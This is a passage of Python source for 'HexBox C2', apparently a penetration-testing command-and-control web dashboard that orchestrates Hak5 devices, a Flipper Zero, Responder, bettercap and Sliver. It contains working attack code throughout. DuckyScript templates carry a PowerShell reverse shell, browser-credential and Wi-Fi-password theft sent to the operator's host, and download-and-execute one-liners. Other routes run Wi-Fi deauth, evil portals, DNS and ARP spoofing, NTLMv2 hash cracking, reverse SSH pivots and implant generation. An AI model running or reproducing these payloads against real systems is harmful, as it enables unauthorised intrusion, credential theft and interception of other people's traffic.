                      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function copyText(text) {
  navigator.clipboard?.writeText(text).catch(()=>{
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta);
    ta.select(); document.execCommand('copy'); ta.remove();
  });
}

// ---- Init ----
initSSE();
checkStatus();
refreshProcs();
loadActiveEngagement();
checkSliver();
setInterval(refreshProcs, 20000);
</script>
</body></html>"""

# ---------------------------------------------------------------------------
# Routes — auth
# ---------------------------------------------------------------------------

_LOGIN_HTML = """<!DOCTYPE html>
<html><head><title>HexBox — Login</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:monospace;
     display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{border:1px solid #0f0;padding:32px 40px;min-width:340px}
h1{margin:0 0 24px;font-size:1.2em}
input{width:100%;background:#111;color:#0f0;border:1px solid #333;
      padding:8px;font-family:monospace;font-size:.9em;margin-bottom:12px}
button{width:100%;background:#111;color:#0f0;border:1px solid #0f0;
       padding:8px;font-family:monospace;font-size:.9em;cursor:pointer}
button:hover{background:#0f0;color:#000}
.err{color:#c00;font-size:.8em;margin-bottom:8px}
</style></head><body>
<div class="box">
  <h1>&#x1F5A5; HexBox C2</h1>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="password" name="token" placeholder="Access Token" autofocus>
    <button type="submit">Connect</button>
  </form>
</div></body></html>"""


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("token") == _TOKEN:
            session["authed"] = True
            return redirect("/")
        return render_template_string(_LOGIN_HTML, error="Invalid token")
    return render_template_string(_LOGIN_HTML, error=None)


@app.route("/logout", methods=["POST"])
def logout():
    session.clear()
    return redirect("/login")

# ---------------------------------------------------------------------------
# Routes — dashboard + SSE
# ---------------------------------------------------------------------------

@app.route("/")
def dash():
    return render_template_string(DASH,
                                  ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                  target=SCAN_TARGET,
                                  hexbox_ip=HEXBOX_IP)


@app.route("/events")
def events_stream():
    if not (session.get("authed") or
            request.headers.get("X-HexBox-Token") == _TOKEN):
        return "", 403

    def stream():
        q: queue.Queue = queue.Queue(maxsize=100)
        with _sse_lock:
            _sse_listeners.append(q)
        try:
            while True:
                try:
                    yield q.get(timeout=25)
                except queue.Empty:
                    yield ": ping\n\n"
        finally:
            with _sse_lock:
                if q in _sse_listeners:
                    _sse_listeners.remove(q)

    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache",
                             "X-Accel-Buffering": "no"})

# ---------------------------------------------------------------------------
# Routes — utility
# ---------------------------------------------------------------------------

@app.route("/status")
def status():
    def _check(dev_name, info):
        ip, up = info.get("ip", ""), False
        for port in (22, 80, info.get("api_port", 0)):
            if not port:
                continue
            try:
                s = socket.create_connection((ip, port), timeout=2)
                s.close()
                up = True
                break
            except Exception:
                pass
        return dev_name, {"ip": ip, "up": up}

    all_devices = dict(DEVICES)
    # Bash Bunny already in DEVICES; add it only if separately configured
    if _BUNNY_CFG.get("ip") and "bashbunny" not in all_devices:
        all_devices["bashbunny"] = _BUNNY_CFG

    result = {}
    with ThreadPoolExecutor(max_workers=max(len(all_devices), 1)) as ex:
        futures = {ex.submit(_check, dev, info): dev for dev, info in all_devices.items()}
        for fut in as_completed(futures):
            name, res = fut.result()
            result[name] = res

    # Flipper Zero: check serial port presence (no TCP)
    fp = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
    result["flipper"] = {"ip": fp, "up": Path(fp).exists()}

    return jsonify(result)


@app.route("/processes")
def list_procs():
    with _procs_lock:
        procs = [{"name": k, "pid": v.pid}
                 for k, v in _procs.items() if v.poll() is None]
    return jsonify(processes=procs)


@app.route("/stop/<name>", methods=["POST"])
def stop_named(name: str):
    if name not in _VALID_PROCS:
        return jsonify(error=f"unknown process: {name}"), 400
    with _procs_lock:
        killed = _stop_proc_locked(name)
    msg = f"Stopped {name}" if killed else f"{name} was not running"
    _log(msg)
    broadcast("proc_stop", {"name": name, "ts": datetime.now().strftime("%H:%M:%S")})
    return jsonify(output=msg)


@app.route("/loot")
def list_loot():
    files = []
    for p in sorted(LOOT.rglob("*")):
        if p.is_file():
            st = p.stat()
            files.append({
                "path":  str(p.relative_to(LOOT)),
                "size":  st.st_size,
                "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
            })
    return jsonify(files=files)


@app.route("/loot/file")
def download_loot_file():
    raw = request.args.get("path", "")
    # Resolve and verify the path stays inside LOOT
    try:
        target = (LOOT / raw).resolve()
        target.relative_to(LOOT.resolve())
    except (ValueError, Exception):
        return "Forbidden", 403
    if not target.is_file():
        return "Not found", 404
    return send_file(str(target), as_attachment=True)


@app.route("/logs/tail")
def tail_log():
    raw = request.args.get("name", "c2")
    try:
        n = min(int(request.args.get("n", 100)), 500)
    except (ValueError, TypeError):
        n = 100
    safe = "".join(c for c in raw if c.isalnum() or c in "_-")
    path = LOGS / f"{safe}.log"
    if not path.exists():
        return jsonify(lines=[])
    lines = path.read_text(errors="replace").splitlines()
    return jsonify(lines=lines[-n:])


@app.route("/serve/<name>")
def serve_payload(name: str):
    safe = Path(name).name
    path = PAYLOADS / safe
    if path.is_file():
        return send_file(str(path))
    return "Not found", 404

# ---------------------------------------------------------------------------
# Routes — Intelligence
# ---------------------------------------------------------------------------

@app.route("/intel/creds")
def intel_creds():
    try:
        from parse_loot import aggregate_intel
    except ImportError:
        import sys
        sys.path.insert(0, str(Path(__file__).parent))
        from parse_loot import aggregate_intel
    data = aggregate_intel(LOOT, LOGS)
    return jsonify(**data)


@app.route("/intel/netmap")
def intel_netmap():
    try:
        from parse_loot import parse_nmap_xml
    except ImportError:
        import sys
        sys.path.insert(0, str(Path(__file__).parent))
        from parse_loot import parse_nmap_xml
    hosts: list[dict] = []
    seen_ips: set[str] = set()
    nmap_dir = LOOT / "nmap"
    if nmap_dir.exists():
        for xml in sorted(nmap_dir.glob("*.xml")):
            for host in parse_nmap_xml(xml):
                if host["ip"] not in seen_ips:
                    seen_ips.add(host["ip"])
                    hosts.append(host)
    return jsonify(hosts=hosts)

# ---------------------------------------------------------------------------
# Routes — Payload builder
# ---------------------------------------------------------------------------

_PAYLOAD_TEMPLATES: dict[str, str] = {
    "reverse_shell": (
        'REM Title: Windows reverse shell to HexBox\n'
        'ATTACKMODE HID STORAGE\nDELAY {delay}\nGUI r\nDELAY 500\n'
        'STRING powershell -w h -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient(\'{ip}\',{port});'
        '$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)'
        '{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);'
        '$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()}}"\nENTER\n'
    ),
    "browser_exfil": (
        'REM Title: Exfil Chrome credentials via PowerShell\n'
        'ATTACKMODE HID STORAGE\nDELAY {delay}\nGUI r\nDELAY 500\n'
        'STRING powershell -w h -nop -ep bypass -c "iwr -Uri http://{ip}:{port}/serve/chrome.ps1 -UseBasicParsing | iex"\n'
        'ENTER\n'
    ),
    "wifi_steal": (
        'REM Title: Steal saved WiFi profiles + passwords\n'
        'ATTACKMODE HID STORAGE\nDELAY {delay}\nGUI r\nDELAY 500\n'
        'STRING powershell -w h -nop -ep bypass -c "$o=\'\';(netsh wlan show profiles)|'
        'Select-String \':\\s(.+)$\'|%{{$n=$_.Matches.Groups[1].Value.Trim();$o+="`n[$n]`n";'
        '$o+=(netsh wlan show profile name=\\"$n\\" key=clear|Out-String)}};'
        'iwr -Uri http://{ip}:{port}/wifi -Method POST -Body @{{d=$o;h=$env:COMPUTERNAME}}"\nENTER\n'
    ),
    "sysinfo": (
        'REM Title: Windows system profiling\n'
        'ATTACKMODE HID STORAGE\nDELAY {delay}\nGUI r\nDELAY 500\n'
        'STRING powershell -w h -nop -ep bypass -c "iwr -Uri http://{ip}:{port}/serve/sysinfo.ps1 -UseBasicParsing | iex"\n'
        'ENTER\n'
    ),
    "ad_recon": (
        'REM Title: Active Directory enumeration\n'
        'ATTACKMODE HID STORAGE\nDELAY {delay}\nGUI r\nDELAY 500\n'
        'STRING powershell -w h -nop -ep bypass -c "iwr -Uri http://{ip}:{port}/serve/ad_recon.ps1 -UseBasicParsing | iex"\n'
        'ENTER\n'
    ),
}


@app.route("/payload/build", methods=["POST"])
def payload_build():
    data  = request.get_json(silent=True) or {}
    ptype = data.get("type", "reverse_shell")
    ip    = data.get("ip", HEXBOX_IP)
    port  = data.get("port", "4444")
    delay = int(data.get("delay", 2000))

    # Validate ip and port
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify(error="invalid IP"), 400
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        return jsonify(error="invalid port"), 400

    tmpl = _PAYLOAD_TEMPLATES.get(ptype)
    if not tmpl:
        return jsonify(error=f"unknown payload type: {ptype}"), 400

    content = tmpl.format(ip=ip, port=port, delay=delay)
    return jsonify(content=content, type=ptype)


@app.route("/payload/list")
def payload_list():
    payloads = []
    for p in sorted(PAYLOADS.iterdir()):
        if p.is_file():
            payloads.append({"name": p.name, "size": p.stat().st_size})
    return jsonify(payloads=payloads)

# ---------------------------------------------------------------------------
# Routes — Engagement sessions
# ---------------------------------------------------------------------------

@app.route("/engagement/new", methods=["POST"])
def engagement_new():
    data   = request.get_json(silent=True) or {}
    name   = re.sub(r"[^a-zA-Z0-9_ -]", "", data.get("name", "")).strip()[:64]
    target = data.get("target", SCAN_TARGET)
    if not name:
        return jsonify(error="name required"), 400
    sessions = _load_sessions()
    if any(s["name"] == name for s in sessions["sessions"]):
        return jsonify(error=f"session '{name}' already exists"), 400
    sessions["sessions"].append({
        "name":    name,
        "target":  target,
        "started": datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    sessions["active"] = name
    _save_sessions(sessions)
    _log(f"New engagement: {name} → {target}")
    return jsonify(name=name, target=target)


@app.route("/engagement/set", methods=["POST"])
def engagement_set():
    data = request.get_json(silent=True) or {}
    name = data.get("name", "")
    sessions = _load_sessions()
    if not any(s["name"] == name for s in sessions["sessions"]):
        return jsonify(error="unknown session"), 404
    sessions["active"] = name
    _save_sessions(sessions)
    return jsonify(active=name)


@app.route("/engagement/list")
def engagement_list():
    return jsonify(**_load_sessions())

# ---------------------------------------------------------------------------
# Routes — Report
# ---------------------------------------------------------------------------

@app.route("/report/generate", methods=["POST"])
def report_generate():
    try:
        from parse_loot import aggregate_intel, generate_html_report
    except ImportError:
        import sys
        sys.path.insert(0, str(Path(__file__).parent))
        from parse_loot import aggregate_intel, generate_html_report

    meta = request.get_json(silent=True) or {}
    meta.setdefault("name", "Unnamed")
    meta.setdefault("target", SCAN_TARGET)

    intel = aggregate_intel(LOOT, LOGS)
    html  = generate_html_report(intel, meta)
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    path  = LOOT / "reports" / f"report_{ts}.html"
    path.write_text(html)
    _log(f"Report generated: {path.name}")
    return jsonify(path=str(path.relative_to(LOOT)), summary=intel["summary"])


@app.route("/report/view")
def report_view():
    raw = request.args.get("path", "")
    try:
        target = (LOOT / raw).resolve()
        target.relative_to(LOOT.resolve())
    except Exception:
        return "Forbidden", 403
    if not target.is_file():
        return "Not found", 404
    return target.read_text()


@app.route("/report/download")
def report_download():
    raw = request.args.get("path", "")
    try:
        target = (LOOT / raw).resolve()
        target.relative_to(LOOT.resolve())
    except Exception:
        return "Forbidden", 403
    if not target.is_file():
        return "Not found", 404
    return send_file(str(target), as_attachment=True,
                     download_name=target.name)

# ---------------------------------------------------------------------------
# Routes — Pineapple
# ---------------------------------------------------------------------------

@app.route("/pineapple/recon", methods=["POST"])
def p_recon():
    out = ssh_exec("pineapple", "iw dev wlan1mon scan 2>&1 | head -100")
    _log(f"Pineapple recon: {len(out)} bytes")
    return jsonify(output=out)


@app.route("/pineapple/deauth", methods=["POST"])
def p_deauth():
    out = ssh_exec("pineapple",
        "aireplay-ng --deauth 10 -a "
        "$(iw dev wlan1mon scan | grep BSS | head -1 | awk '{print $2}') wlan1mon")
    _log("Pineapple deauth")
    return jsonify(output=out)


@app.route("/pineapple/evil_portal", methods=["POST"])
def p_portal():
    out = ssh_exec("pineapple", "/etc/init.d/evilportal start && evilportal start")
    _log("Evil Portal started")
    return jsonify(output=out)


@app.route("/pineapple/monitor_mode", methods=["POST"])
def p_monitor():
    out = ssh_exec("pineapple",
        "airmon-ng check kill; airmon-ng start wlan1; iw dev wlan1mon info")
    _log("Pineapple monitor mode")
    return jsonify(output=out or "Monitor mode started on wlan1mon")


@app.route("/pineapple/pmkid", methods=["POST"])
def p_pmkid():
    cap = "/tmp/pmkid.pcapng"
    out = ssh_exec("pineapple",
        f"hcxdumptool -i wlan1mon -o {cap} --enable_status=1 -t 30 && "
        f"hcxpcapngtool -o /tmp/pmkid.hash {cap} 2>&1")
    sftp_pull("pineapple", "/tmp", LOOT / "handshakes")
    _log("PMKID capture complete")
    return jsonify(output=out or "PMKID capture attempted — check loot/handshakes/")


@app.route("/pineapple/handshakes", methods=["POST"])
def p_hand():
    out = sftp_pull("pineapple", "/root/handshakes", LOOT / "handshakes")
    _log(f"Handshakes: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Routes — Shark Jack
# ---------------------------------------------------------------------------

@app.route("/shark/nmap", methods=["POST"])
def s_nmap():
    out = ssh_exec("sharkjack",
        "nmap -sS -sV -O -T4 $(ip route | grep default | awk '{print $3}')/24")
    _log("Shark nmap")
    return jsonify(output=out)


@app.route("/shark/arp", methods=["POST"])
def s_arp():
    out = ssh_exec("sharkjack",
        "arp-scan --localnet 2>&1 || nmap -sn $(ip route | grep default | awk '{print $3}')/24 -oG - | grep Up")
    _log("Shark ARP scan")
    return jsonify(output=out)


@app.route("/shark/loot", methods=["POST"])
def s_loot():
    out = sftp_pull("sharkjack", "/root/loot", LOOT / "shark")
    _log(f"Shark loot: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Routes — Packet Squirrel
# ---------------------------------------------------------------------------

@app.route("/squirrel/pcap", methods=["POST"])
def sq_pcap():
    out = ssh_exec("packetsquirrel",
                   "tcpdump -i br-lan -w /mnt/loot/capture_$(date +%s).pcap &")
    _log("Squirrel PCAP started")
    return jsonify(output=out or "PCAP capture started in background")


@app.route("/squirrel/dnsspoof", methods=["POST"])
def sq_dns():
    out = ssh_exec("packetsquirrel", "dnsspoof -i br-lan -f /root/hosts.txt &")
    _log("Squirrel DNS spoof started")
    return jsonify(output=out or "DNS spoof started in background")


@app.route("/squirrel/arpscan", methods=["POST"])
def sq_arp():
    out = ssh_exec("packetsquirrel", "arp-scan -I br-lan --localnet 2>&1 | head -40")
    _log("Squirrel ARP scan")
    return jsonify(output=out)


@app.route("/squirrel/pull", methods=["POST"])
def sq_pull():
    out = sftp_pull("packetsquirrel", "/mnt/loot", LOOT / "pcaps")
    _log(f"Squirrel pull: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Routes — LAN Turtle
# ---------------------------------------------------------------------------

@app.route("/turtle/autossh", methods=["POST"])
def t_ssh():
    out = ssh_exec("lanturtle",
                   "turtle module enable autossh && turtle module start autossh")
    _log("Turtle autossh")
    return jsonify(output=out)


@app.route("/turtle/responder", methods=["POST"])
def t_resp():
    out = ssh_exec("lanturtle",
                   "turtle module enable responder && turtle module start responder")
    _log("Turtle responder")
    return jsonify(output=out)


@app.route("/turtle/meterpreter", methods=["POST"])
def t_met():
    out = ssh_exec("lanturtle",
                   "turtle module enable meterpreter && turtle module start meterpreter")
    _log("Turtle meterpreter")
    return jsonify(output=out)


@app.route("/turtle/sshpivot", methods=["POST"])
def t_pivot():
    out = ssh_exec("lanturtle",
        f"ssh -f -N -R 2222:127.0.0.1:22 root@{HEXBOX_IP} "
        f"-o StrictHostKeyChecking=no -o ServerAliveInterval=30 &")
    _log("Turtle SSH pivot")
    return jsonify(output=out or f"SSH pivot tunnel → {HEXBOX_IP}:2222")

# ---------------------------------------------------------------------------
# Routes — OMG Plug
# ---------------------------------------------------------------------------

def _omg_deploy(payload_name: str) -> str:
    path = PAYLOADS / payload_name
    if not path.exists():
        return f"[ERR] Payload not found: {path}"
    url = f"http://{DEVICES['omgplug']['ip']}/api/payload"
    try:
        r = _req.post(url, json={"payload": path.read_text()}, timeout=10)
        return r.text or "Deployed"
    except Exception as e:
        return f"[ERR] {e}"


@app.route("/omg/payload/reverse",  methods=["POST"])
def omg_rev():
    return jsonify(output=_omg_deploy("reverse_shell.ducky"))


@app.route("/omg/payload/exfil",    methods=["POST"])
def omg_exfil():
    return jsonify(output=_omg_deploy("browser_exfil.ducky"))


@app.route("/omg/payload/wifi",     methods=["POST"])
def omg_wifi():
    return jsonify(output=_omg_deploy("wifi_steal.ducky"))


@app.route("/omg/payload/sysinfo",  methods=["POST"])
def omg_sysinfo():
    return jsonify(output=_omg_deploy("sysinfo.ducky"))


@app.route("/omg/payload/ad_recon", methods=["POST"])
def omg_ad():
    return jsonify(output=_omg_deploy("ad_recon.ducky"))

# ---------------------------------------------------------------------------
# Routes — Pi local
# ---------------------------------------------------------------------------

@app.route("/pi/scan", methods=["POST"])
def pi_scan():
    data   = request.get_json(silent=True) or {}
    target = data.get("target", SCAN_TARGET)
    try:
        ipaddress.ip_network(target, strict=False)
    except ValueError:
        return jsonify(error=f"invalid target: {target}"), 400
    nmap_dir  = LOOT / "nmap"
    nmap_dir.mkdir(parents=True, exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    xml_file = str(nmap_dir / f"scan_{ts}.xml")
    txt_file = str(nmap_dir / f"scan_{ts}.txt")
    pid = start_proc("scan", [
        "nmap", "-sS", "-sV", "-T4", target,
        "-oX", xml_file, "-oN", txt_file,
    ])
    _log(f"Pi nmap → {target} (pid={pid})")
    return jsonify(output=f"Scan started (pid={pid}) — results → loot/nmap/")


@app.route("/pi/responder", methods=["POST"])
def pi_resp():
    iface   = shlex.quote(IFACE_RESPONDER)
    log_arg = shlex.quote(str(LOGS / "responder.log"))
    pid = start_proc("responder",
                     f"responder -I {iface} -wrf >> {log_arg} 2>&1")
    return jsonify(output=f"Responder started (pid={pid}) on {IFACE_RESPONDER}")


@app.route("/pi/bettercap", methods=["POST"])
def pi_bc():
    pid = start_proc("bettercap", [
        "bettercap", "-iface", IFACE_BETTERCAP, "-eval",
        "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on",
    ])
    return jsonify(output=f"Bettercap MITM started (pid={pid}) on {IFACE_BETTERCAP}")


@app.route("/pi/handshake_crack", methods=["POST"])
def pi_crack():
    handshakes = LOOT / "handshakes"
    caps = list(handshakes.glob("*.cap")) if handshakes.is_dir() else []
    if not caps:
        return jsonify(output="No .cap files in loot/handshakes — capture a handshake first"), 400
    loot_q = shlex.quote(str(handshakes))
    log_q  = shlex.quote(str(LOGS / "crack.log"))
    pid = start_proc("crack",
        f'for h in {loot_q}/*.cap; do [ -f "$h" ] || continue; '
        f'aircrack-ng -w /usr/share/wordlists/rockyou.txt "$h" >> {log_q}; done')
    return jsonify(output=f"Cracking {len(caps)} cap(s) (pid={pid}) — logs/crack.log")


@app.route("/pi/hashcat", methods=["POST"])
def pi_hashcat():
    """Extract NTLMv2 hashes from Responder logs and crack with hashcat."""
    try:
        from parse_loot import parse_responder_hashes
    except ImportError:
        import sys
        sys.path.insert(0, str(Path(__file__).parent))
        from parse_loot import parse_responder_hashes

    hashes: list[str] = []
    seen: set[str] = set()
    resp_dirs = [LOGS, Path("/usr/share/responder/logs"), Path("/opt/Responder/logs")]
    for d in resp_dirs:
        if not d.exists():
            continue
        for f in sorted(d.glob("*.log")) + sorted(d.glob("*.txt")):
            for h in parse_responder_hashes(f):
                if h["hash"] not in seen and h["type"] == "NTLMv2":
                    seen.add(h["hash"])
                    hashes.append(h["hash"])

    if not hashes:
        return jsonify(output="No NTLMv2 hashes found in Responder logs — run Responder first"), 400

    hash_file    = LOOT / "ntlmv2_hashes.txt"
    cracked_file = LOOT / "cracked.txt"
    hash_file.write_text("\n".join(hashes) + "\n")
    log_q     = shlex.quote(str(LOGS / "hashcat.log"))
    hash_q    = shlex.quote(str(hash_file))
    cracked_q = shlex.quote(str(cracked_file))

    pid = start_proc("hashcat",
        f"hashcat -m 5600 {hash_q} /usr/share/wordlists/rockyou.txt "
        f"-o {cracked_q} --quiet >> {log_q} 2>&1")
    _log(f"Hashcat started: {len(hashes)} NTLMv2 hash(es)")
    return jsonify(output=f"Hashcat started (pid={pid}) — {len(hashes)} hash(es) → loot/cracked.txt")

# ---------------------------------------------------------------------------
# Routes — Bash Bunny
# ---------------------------------------------------------------------------

def _bunny_ssh(cmd: str) -> str:
    d = _BUNNY_CFG
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=10)
        _, out, err = c.exec_command(cmd)
        return out.read().decode() + err.read().decode()
    except Exception as e:
        return f"[ERR] {e}"
    finally:
        c.close()


@app.route("/bunny/status")
def bunny_status():
    out = _bunny_ssh("uptime && cat /etc/bunny_version 2>/dev/null || echo 'Bash Bunny'")
    return jsonify(output=out, up=not out.startswith("[ERR]"))


@app.route("/bunny/recon", methods=["POST"])
def bunny_recon():
    out = _bunny_ssh(
        "GW=$(ip route | awk '/default/{print $3; exit}');"
        "SUBNET=${GW%.*}.0/24;"
        "arp-scan --localnet 2>&1 | head -40 || nmap -sn \"$SUBNET\" 2>&1 | head -40"
    )
    _log(f"Bash Bunny recon: {len(out)} bytes")
    return jsonify(output=out or "No output — check Bash Bunny connectivity")


@app.route("/bunny/loot", methods=["POST"])
def bunny_loot():
    dest = LOOT / "bunny"
    for remote in ("/tmp/bb_recon", "/root/loot"):
        try:
            d = _BUNNY_CFG
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
            sftp = c.open_sftp()
            entries = sftp.listdir(remote)
            dest.mkdir(parents=True, exist_ok=True)
            count = 0
            for name in entries:
                try:
                    sftp.get(f"{remote}/{name}", str(dest / name))
                    count += 1
                except Exception:
                    pass
            sftp.close()
            c.close()
            if count:
                _log(f"Bash Bunny loot: {count} file(s) from {remote}")
                return jsonify(output=f"Pulled {count} file(s) from {remote} → loot/bunny/")
        except Exception:
            pass
    return jsonify(output="[ERR] No loot directories found on Bash Bunny (run a recon first)")


@app.route("/bunny/payload/install", methods=["POST"])
def bunny_install():
    data   = request.get_json(silent=True) or {}
    switch = int(data.get("switch", 1))
    if switch not in (1, 2):
        return jsonify(error="switch must be 1 or 2"), 400
    src_map = {1: "bunny_recon.sh", 2: "bunny_exfil.sh"}
    src = PAYLOADS / src_map[switch]
    if not src.exists():
        return jsonify(error=f"Payload {src.name} not found in payloads/"), 404
    dest_path = f"/root/udisk/payloads/switch{switch}/payload.sh"
    try:
        d = _BUNNY_CFG
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
        sftp = c.open_sftp()
        sftp.put(str(src), dest_path)
        c.exec_command(f"chmod +x {dest_path}")
        sftp.close()
        c.close()
        _log(f"Bash Bunny switch{switch} payload installed")
        return jsonify(output=f"Installed {src.name} → {dest_path}")
    except Exception as e:
        return jsonify(error=str(e)), 500

# ---------------------------------------------------------------------------
# Routes — Flipper Zero serial bridge
# ---------------------------------------------------------------------------

def _flipper_cmd(cmd: str, read_timeout: float = 6.0) -> str:
    port = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
    if not Path(port).exists():
        return f"[ERR] Serial port {port} not found — is Flipper Zero connected?"
    try:
        import serial
    except ImportError:
        return "[ERR] pyserial not installed — run: pip install pyserial"
    try:
        with serial.Serial(port, 230400, timeout=1.0) as ser:
            ser.reset_input_buffer()
            ser.write(f"\r{cmd}\r\n".encode())
            ser.flush()
            resp = b""
            deadline = time.time() + read_timeout
            while time.time() < deadline:
                chunk = ser.read(ser.in_waiting or 1)
                if chunk:
                    resp += chunk
                    if b">: " in resp or b"error" in resp.lower():
                        break
                else:
                    time.sleep(0.05)
            return resp.decode(errors="replace").strip()
    except Exception as e:
        return f"[ERR] {e}"


@app.route("/flipper/status")
def flipper_status():
    port = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
    up   = Path(port).exists()
    return jsonify(port=port, up=up,
                   output=f"Flipper Zero: {'connected' if up else 'not found'} at {port}")


@app.route("/flipper/nfc", methods=["POST"])
def flipper_nfc():
    out = _flipper_cmd("nfc detect")
    _log(f"Flipper NFC: {out[:80]}")
    return jsonify(output=out)


@app.route("/flipper/rfid", methods=["POST"])
def flipper_rfid():
    out = _flipper_cmd("rfid read")
    _log(f"Flipper RFID: {out[:80]}")
    return jsonify(output=out)


@app.route("/flipper/badusb", methods=["POST"])
def flipper_badusb():
    out = _flipper_cmd("badusb run /ext/badusb/payload.txt", read_timeout=15.0)
    _log(f"Flipper BadUSB: {out[:80]}")
    return jsonify(output=out)


@app.route("/flipper/subghz", methods=["POST"])
def flipper_subghz():
    out = _flipper_cmd("subghz rx 433920000 --timeout 30", read_timeout=35.0)
    _log(f"Flipper Sub-GHz: {out[:80]}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Routes — Sliver C2 implant generation
# ---------------------------------------------------------------------------

_SLIVER_DIR     = Path.home() / ".sliver"
_SLIVER_OP_CFG  = _SLIVER_DIR / "hexbox-operator.cfg"
_SLIVER_IMPLANTS = LOOT / "implants"


def _sliver_installed() -> bool:
    return bool(shutil.which("sliver-server"))


def _ensure_sliver_operator() -> tuple[bool, str]:
    if _SLIVER_OP_CFG.exists():
        return True, str(_SLIVER_OP_CFG)
    if not _sliver_installed():
        return False, "sliver-server not installed (apt install sliver / see sliver docs)"
    _SLIVER_DIR.mkdir(parents=True, exist_ok=True)
    result = subprocess.run(
        ["sliver-server", "operator",
         "--name", "hexbox",
         "--lhost", "127.0.0.1",
         "--lport", str(_SLIVER_CFG.get("port", 31337)),
         "--save", str(_SLIVER_OP_CFG)],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0 or not _SLIVER_OP_CFG.exists():
        return False, result.stderr.strip() or "Failed to create operator config"
    return True, str(_SLIVER_OP_CFG)


def _sliver_client_cmd(cmd: str, timeout: int = 90) -> str:
    ok, cfg_or_err = _ensure_sliver_operator()
    if not ok:
        return f"[ERR] {cfg_or_err}"
    client = shutil.which("sliver-client")
    if not client:
        return "[ERR] sliver-client not installed"
    try:
        proc = subprocess.run(
            [client, "--config", str(_SLIVER_OP_CFG)],
            input=f"{cmd}\nexit\n",
            capture_output=True, text=True, timeout=timeout,
        )
        return (proc.stdout + proc.stderr).strip()
    except subprocess.TimeoutExpired:
        return "[ERR] Command timed out"
    except Exception as e:
        return f"[ERR] {e}"


@app.route("/sliver/status")
def sliver_status():
    installed = _sliver_installed()
    pid = None
    running = False
    with _procs_lock:
        p = _procs.get("sliver")
        if p and p.poll() is None:
            running = True
            pid = p.pid
    if not running:
        try:
            r = subprocess.run(["pgrep", "-x", "sliver-server"],
                               capture_output=True, text=True, timeout=3)
            if r.returncode == 0 and r.stdout.strip():
                running = True
                pid = int(r.stdout.strip().splitlines()[0])
        except Exception:
            pass
    return jsonify(installed=installed, running=running, pid=pid)


@app.route("/sliver/start", methods=["POST"])
def sliver_start():
    if not _sliver_installed():
        return jsonify(error="sliver-server not installed"), 400
    host = _SLIVER_CFG.get("host", "127.0.0.1")
    port = _SLIVER_CFG.get("port", 31337)
    pid = start_proc("sliver", [
        "sliver-server", "daemon",
        "--lhost", host, "--lport", str(port),
    ])
    _log(f"Sliver server started (pid={pid})")
    return jsonify(output=f"Sliver server started (pid={pid}) — listening on {host}:{port}")


@app.route("/sliver/generate", methods=["POST"])
def sliver_generate():
    data     = request.get_json(silent=True) or {}
    os_name  = data.get("os", "windows")
    arch     = data.get("arch", "amd64")
    fmt      = data.get("format", "exe")
    listener = data.get("listener", f"http://{HEXBOX_IP}")

    if os_name not in ("windows", "linux", "darwin"):
        return jsonify(error="invalid os"), 400
    if arch not in ("amd64", "386", "arm64"):
        return jsonify(error="invalid arch"), 400
    if fmt not in ("exe", "shellcode", "shared", "service"):
        return jsonify(error="invalid format"), 400

    _SLIVER_IMPLANTS.mkdir(parents=True, exist_ok=True)
    cmd = (f"generate --{fmt.replace('exe','exe')} "
           f"--os {os_name} --arch {arch} "
           f"--http {listener} "
           f"--save {_SLIVER_IMPLANTS}")

    if not _sliver_installed():
        return jsonify(
            output=f"[INFO] sliver-server not installed.\n"
                   f"Install: curl https://sliver.sh/install|sudo bash\n"
                   f"Then run implant generation manually:\n  sliver-client\n  > {cmd}",
            implant=None,
        )

    output = _sliver_client_cmd(cmd, timeout=120)
    # Find newly generated implant
    new_implant = None
    for f in sorted(_SLIVER_IMPLANTS.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
        if f.is_file():
            new_implant = f.name
            break

    _log(f"Sliver generate {os_name}/{arch}/{fmt}: {new_implant or 'failed'}")
    return jsonify(output=output, implant=new_implant)


@app.route("/sliver/sessions")
def sliver_sessions():
    if not _sliver_installed():
        return jsonify(sessions=[])
    output = _sliver_client_cmd("sessions", timeout=15)
    sessions: list[dict] = []
    for line in output.splitlines():
        # Parse sliver sessions table: ID  Name  Transport  Host  Port  User  OS/Arch  Last Active
        parts = line.split()
